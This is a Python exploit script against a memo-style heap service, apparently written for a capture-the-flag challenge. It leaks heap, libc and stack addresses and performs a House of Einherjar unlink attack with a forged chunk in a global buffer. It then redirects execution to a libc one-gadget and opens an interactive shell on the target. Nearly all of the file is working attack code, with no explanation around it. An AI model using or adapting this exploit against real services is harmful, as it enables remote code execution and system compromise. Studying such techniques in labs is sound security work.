import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


s, f = sock("127.0.0.1", 4088)
# s, f = sock("192.168.33.11", 4088)

def debug(func):
    def wrapper(*args, **kwargs):
        print '{} ({}, {})'.format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(size, content):
    read_until(f, '(CMD)>>> ')
    f.write('A\n')
    read_until(f, '(SIZE)>>> ')
    f.write('{}\n'.format(str(size)))
    read_until(f, '(CONTENT)>>> ')
    f.write(content)


@debug
def edit(index, content):
    read_until(f, '(CMD)>>> ')
    f.write('E\n')
    read_until(f, '(INDEX)>>> ')
    f.write('{}\n'.format(str(index)))
    read_until(f, 'CONTENT: ')
    f.write(content)
    read_until(f, '(Y/n)>>> ')
    f.write('Y\n')


@debug
def delete(index):
    read_until(f, '(CMD)>>> ')
    f.write('D\n')
    read_until(f, '(INDEX)>>> ')
    f.write('{}\n'.format(str(index)))


@debug
def show(index):
    read_until(f, 'INDEX: {}'.format(str(index)))
    read_until(f, 'CONTENT: ')
    data = read_until(f, '+-----').rstrip('+-').rstrip()
    return data


add(0x68, 'hogehoge/bin/sh\n')
add(0x68, 'fugafuga\n')
add(0xf8, 'baarbaar\n')
delete(2)
delete(1)

data = u64(show(1).ljust(8, '\x00'))
addr_heap = data - 0x70
delete(3)
print 'addr_heap = {}'.format(hex(addr_heap))

add(0xf8, 'A' * 0xf8 + '\n')
add(0xf8, 'B' * 0xf8 + '\n')
add(0xf8, 'C' * 0xf8 + '\n')
add(0xf8, 'D' * 0xf8 + '\n')

delete(1)
data = u64(show(1).ljust(8, '\x00'))
addr_libc = data - 0x3c4b78
print 'addr_libc = {}'.format(hex(addr_libc))

addr_global_buf   = 0x602040
# addr_target_chunk = addr_heap + 0x250
addr_target_chunk = addr_heap + 0x100
fake_size = addr_target_chunk - addr_global_buf

print 'fake_size = {}'.format(hex(fake_size))

# set fake_size of fake chunk as fake prev size
# unset prev in use
buf = p64(fake_size).rjust(0xf8, 'E') + '\x00\n'
add(0xf8, buf)

# place fake chunk at global buf
# the global buf is placed just before memo tables
buf  = p64(0) # @ addr_global_buf
# buf += p64(fake_size)
buf += p64(0xf1)
buf += p64(addr_global_buf)
buf += p64(addr_global_buf)
buf += p64(0)
buf  = buf.ljust(0xf0, 'P')
buf += p64(0xf0)
buf  = buf.ljust(0x100, '\x00')
buf += '\n'

edit(3, buf)

# trigger unlink attack (house of einherjar)
delete(2)

print 'press enter to continue'
raw_input()
add(0x50, 'hogehoge\n')
delete(2)


print 'overwrite first pointer to point to environ'
addr_environ = addr_libc + 0x3c6f38
buf  = 'F' * (0xf0 - 0x60)
buf += p64(0xfffffffffffffff) # 1
buf += p64(addr_environ)
buf += p64(0xfffffffffffffff) # 2
buf += p64(0x602168) # table no. 3
buf += p64(0xfffffffffffffff) # 3
buf += p64(addr_libc + 0x18cd57) # 3
buf += p64(0)
buf += '\n'
add(0x100, buf)

# read_until(f, 'No such a command')

environ = u64(show(1).ljust(8, '\x00'))
addr_stack = environ - 0x209d8
print 'addr_stack = {}'.format(hex(addr_stack))

print 'point pad 2 to old rbp'
addr_ret_addr = addr_stack + 0x208e8
edit(2, p64(addr_ret_addr) + '\n')

print 'overwrite malloc hook with one gadget'
one_gadgets_offsets = [283158, 283242, 983716, 987463]
addr_one_gadet = addr_libc + one_gadgets_offsets[0]
edit(3, p64(addr_one_gadet) + '\n')

print 'open shell!!!!!'
read_until(f, '(CMD)>>> ')
f.write('Q\n')


shell(s)
